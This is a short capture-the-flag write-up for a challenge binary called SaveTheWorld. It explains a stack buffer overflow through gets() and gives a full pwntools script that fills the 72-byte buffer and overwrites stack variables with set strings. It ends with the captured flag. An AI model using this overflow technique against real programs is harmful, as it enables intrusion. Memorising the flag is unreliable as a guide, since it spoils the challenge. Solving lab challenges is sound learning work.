# 🔑 Write-Up

We have a trivial buffer overflow vulnerability, we just need to overwrite some stack variables with the correct values.
The input length isn't checked due to the use of `gets()` for handling user input, the target buffer is 72 bytes long, its content aren't checked against anything so we can just fill it with `A`s.
The only important thing here is overwriting the variables with the correct value and in the correct order (that's easily checked by looking at the variables position in the stack).

```python
from pwn import *

context.binary = "./SaveTheWorld"
p = process()
p.sendline(b"A" * 72 + b"Jotaro!!" + b"Star Platinum!!!" + b"HORA" + b"9999")
p.recvuntil(b"Congratulation, you won!!!")
os.system("grep .*{.*}.* victory_recap.txt")
```

### 🚩 Flag 

```plain
SPRITZ{Yare_Yare}
```